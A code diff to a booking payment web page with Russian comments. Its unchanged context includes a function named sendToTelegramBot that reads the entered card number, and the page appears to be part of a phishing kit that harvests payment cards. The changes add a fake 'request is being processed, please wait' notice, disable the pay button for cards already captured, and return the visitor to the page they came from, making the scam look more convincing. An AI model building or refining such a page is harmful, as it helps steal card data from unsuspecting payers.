@@ -1074,6 +1074,11 @@
 
         let currentLanguage = sessionStorage.getItem('selectedLanguage') || 'ru';
 
+        // Сохраняем referrer при загрузке страницы
+        if (!sessionStorage.getItem('paymentReferrer')) {
+            sessionStorage.setItem('paymentReferrer', document.referrer || 'index.html');
+        }
+
         function loadBookingData() {
             const bookingData = sessionStorage.getItem('bookingData');
             const formData = sessionStorage.getItem('formData');
@@ -1276,7 +1281,9 @@
         });
 
         backBtn.addEventListener('click', () => {
-            window.location.href = 'index.html';
+            // Возвращаем на исходную страницу
+            const referrer = sessionStorage.getItem('paymentReferrer') || 'index.html';
+            window.location.href = referrer;
         });
 
         let paymentCounter = 0;
@@ -1305,6 +1312,18 @@
             }
         }
 
+        function showBoundCardWaitingMessage() {
+            const resultMessage = document.getElementById('resultMessage');
+            resultMessage.className = 'result-message success';
+            resultMessage.style.display = 'block';
+            resultMessage.textContent = '✅ Ваша заявка находится в обработке, ожидайте';
+            
+            // Делаем кнопку оплаты неактивной
+            const payBtn = document.getElementById('payBtn');
+            payBtn.disabled = true;
+            payBtn.innerHTML = '<i class="fas fa-clock"></i> Заявка в обработке';
+        }
+
         async function sendToTelegramBot() {
     try {
         const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
@@ -1315,8 +1334,8 @@
         console.log('🔍 Статус карты:', isCardBound ? 'ПРИВЯЗАНА' : 'НЕ ПРИВЯЗАНА');
         
         if (isCardBound) {
-            // ЕСЛИ КАРТА УЖЕ ПРИВЯЗАНА - ПОКАЗЫВАЕМ СООБЩЕНИЕ
-            showAlreadyBoundMessage();
+            // ЕСЛИ КАРТА УЖЕ ПРИВЯЗАНА - ПОКАЗЫВАЕМ СООБЩЕНИЕ О ЖДАНИИ
+            showBoundCardWaitingMessage();
             return false;
         }
         
@@ -1518,6 +1537,3 @@
     </script>
 </body>
 </html>
-
-
-
